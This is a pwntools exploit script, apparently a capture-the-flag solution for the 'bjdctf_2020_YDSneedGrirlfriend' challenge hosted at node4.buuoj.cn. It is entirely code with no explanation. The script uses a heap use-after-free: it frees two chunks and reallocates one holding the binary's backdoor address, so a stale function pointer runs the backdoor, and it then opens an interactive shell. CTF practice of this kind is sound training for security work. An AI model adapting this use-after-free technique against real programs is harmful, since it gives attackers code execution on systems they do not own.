from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('bjdctf_2020_YDSneedGrirlfriend')
io = remote('node4.buuoj.cn', 29143)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('bjdctf_2020_YDSneedGrirlfriend')
backdoor = elf.sym['backdoor']


def add(size, name):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Her name size is :', str(size))
    io.sendafter('Her name is :', name)


def delete(index):
    io.sendlineafter('Your choice :', '2')
    io.sendlineafter('Index :', str(index))


def show(index):
    io.sendlineafter('Your choice :', '3')
    io.sendlineafter('Index :', str(index))


def pwn():
    add(0x20, cyclic(0x20))
    add(0x20, cyclic(0x20))
    delete(0)
    delete(1)
    add(0x10, p64(backdoor) + cyclic(8))
    show(0)
    io.interactive()


if  __name__ == '__main__':
    pwn()
